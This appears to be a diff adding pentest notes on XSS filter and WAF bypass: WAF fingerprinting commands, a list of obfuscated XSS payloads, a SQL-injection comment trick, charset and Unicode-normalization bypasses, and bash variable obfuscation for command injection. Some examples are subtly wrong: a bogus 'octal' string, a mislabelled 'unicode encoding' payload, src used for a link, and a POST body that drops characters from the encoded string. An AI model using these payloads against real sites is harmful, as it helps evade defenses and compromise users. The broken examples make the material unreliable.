@@ -1,4 +1,205 @@
 1) .........................................................xss filterbypass technique........................................................
 
 xss filters :- xss filters are security mechanism implemented by web applications to detect and block potentially 
-malicious scripts.
+malicious scripts.They analyze user input and try to neutralize user inputs that may trigger xss attack.
+filters are essential but they can be bypassed leading to emergence of creative bypass technique.
+
+a)Context Matters
+Understanding the context in which user input is reflected is crucial. Filters may vary depending on whether the input is placed 
+within a script tag, an HTML attribute, or inline JavaScript.
+
+b)Encoding and Filtering
+XSS filters usually employ encoding and filtering techniques to sanitize input. Encoding replaces special characters with their HTML 
+or JavaScript equivalents, while filtering removes or escapes certain characters.
+
+c)User Interaction
+Filters are often designed to block common XSS vectors such as <script> tags and JavaScript events. To bypass them, one needs to be mindful 
+of how user interactions and browser behavior can be exploited.
+
+    FILTER BYPASS TECHNIQUES ::::::::::::---------------------------
+
+1)Obfuscation → One common technique is to obfuscate the payload, making it more challenging for filters to detect. For instance, 
+encoding characters using URL encoding or escaping HTML entities can often evade filters.
+
+2)Polyglot Payloads → These payloads are designed to work in multiple contexts. A polyglot payload may execute as JavaScript and also be 
+interpreted as an HTML tag, enabling it to bypass context-specific filters.
+
+3)Case Sensitivity → Filters are often case-sensitive. Changing the case of letters in your payload or mixing uppercase and lowercase characters 
+can bypass filters that rely on case matching.
+
+4)Double Encoding → Some filters may not account for double encoding. By encoding characters more than once (e.g., %25 instead of %), you can 
+trick the filter into letting your payload through.
+
+5)Filter Evasion with Event Handlers → If filters block specific event handlers (e.g., onmouseover), try different event handlers that might not 
+be detected.
+
+6)DOM-Based XSS → Filters may not effectively protect against DOM-based XSS, which relies on manipulating the Document Object Model. Look for client-side 
+filters that are oblivious to DOM manipulation.
+
+7)Client-Side Parsing → Leverage client-side parsing of user inputs. Some filters only operate on the server-side, leaving the door open for 
+client-side execution.
+
+
+
+ii) ........................................................ ByPassing waf(web application firewall).......................................................................................
+
+WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include 
+CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.
+
+Depending upon the combination of mechanisms used by firewall the bypassing method may differ.
+ WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them here. 
+WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the 
+signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.
+
+IDENTIFYING WAF's :::---
+
+a)Manually
+As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the 
+web application with a malicious query in the URL such as https://example.com/?p4yl04d3=<script>alert(document.cookie)</script>. The HTTP response may be different 
+than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.
+
+Through a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:
+
+The name of the WAF in the Server header (e.g. Server: cloudflare)
+Additional HTTP response headers associated with the WAF (e.g. CF-RAY: xxxxxxxxxxx)
+Cookies that appear to be set by a WAF (e.g. the response headerSet-Cookie: __cfduid=xxxxx)
+Unique response code upon submitting malicious requests. (e.g. 412)
+Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a FIN/RST TCP packet to the server or 
+implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.
+
+b) Automations..
+i)running N-map scan
+The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.
+
+$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT
+Nmap scan report for example.com (xxx.xxx.xxx.xxx)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE
+443/tcp open  https
+| http-waf-detect: IDS/IPS/WAF detected:
+|_example.com:443/?p4yl04d3=<script>alert(document.cookie)</script>
+
+Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+
+ii)WafW00f
+Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to 
+detect and identify the firewall when possible.
+
+ex:- wafw00f example.com      
+
+iii) WhatWaf
+In addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s 
+response to the various payloads.
+ex:- WhatWaf -u https://amazon.com
+
+.............................................................................BYPASSING WAFs.........................................................................
+
+1) ByPassing regex :-
+This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, 
+finding the regular expression used by the WAF may not be an option. If the regex is accessible
+
+Commmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, 
+using an alternative syntax, and using linebreaks or tabs. The examples below demonstrate some approaches to bypassing regex with comments
+
+<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
+<<script>alert(XSS)</script> #prepending an additional "<"
+<script>alert(XSS) // #removing the closing tag
+<script>alert`XSS`</script> #using backticks instead of parenetheses
+java%0ascript:alert(1) #using encoded newline characters
+<iframe src=http://malicous.com < #double open angle brackets
+<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
+<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
+
+ii)Obfuscation
+While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.
+Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
+javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
+<iframe src="javascript:alert(`xss`)"> #unicode encoding
+/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
+new Function`alt\`6\``; #using backticks instead of parentheses
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
+%26%2397;lert(1) #using HTML encoding
+<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks 
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters
+
+iii)Charset
+This technique involves modifying the Content-Type header to use a different charset (e.g. ibm500). A WAF that is not configured to detect malicious 
+payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python
+
+$ python3
+-- snip --
+>>> import urllib.parse
+>>> s = '<script>alert("xss")</script>'
+>>> urllib.parse.quote_plus(s.encode("IBM037"))
+'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n'
+
+The encoded string can then be sent in the request body and uploaded to the server.
+
+POST /comment/post HTTP/1.1
+Host: chatapp
+Content-Type: application/x-www-form-urlencoded; charset=ibm500
+Content-Length: 74
+
+%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
+
+iv)Content Size
+In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass 
+the firewall by increasing the size of the request body or URL.
+
+v) Unicode Compatibility
+
+http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg
+Unicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. 
+It is a form of unicode equivalence.
+
+For instance, the characters／(U+FF0F) and / (U+002F) are different, but in some contexts they will have the same meaning as each other. 
+The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard 
+forward-slash character/(U+002F) despite starting out as different characters. Digging deeper, whether ／(U+FF0F) and / (U+002F) will end 
+up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.
+
+Characters are typically normalized through one of the four standard Unicode normalization algorithms:
+
+NFC: Normalization Form Canonical Composition
+NFD: Normalization Form Canonical Decomposition
+NFKC: Normalization Form Compatibility Composition
+NFKD: Normalization Form Compatibility Decomposition
+NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details here). 
+The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, 
+compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting 
+unicode-compatible characters. Jorge Lahara demonstrates this in the PoC webserver below.
+
+from flask import Flask, abort, request
+import unicodedata
+from waf import waf
+
+app = Flask(__name__)
+
+
+@app.route('/')
+def Welcome_name():
+  name = request.args.get('name')
+
+
+  if waf(name):
+    abort(403, description="XSS Detected")
+  else:
+    name = unicodedata.normalize('NFKD', name) #NFC, NFKC, NFD, and NFKD
+    return 'Test XSS: ' + name
+
+if __name__ == '__main__':
+  app.run(port=81)
+Where the inial payload of ＜img src=p onerror='prompt(1)'> may have been detected by the firewall, the payload constructed with Unicode-compatible
+characters (＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥) would remain undetected.
+
+Web servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found here.
+
+vi)Uninitialized Variables
+potential method is to use uninitialized variables in your request (e.g. $u) as demonstrated in this article. This is possible in command execution scenarios 
+because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.
+When on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.
+
+ex:- echo $u
+
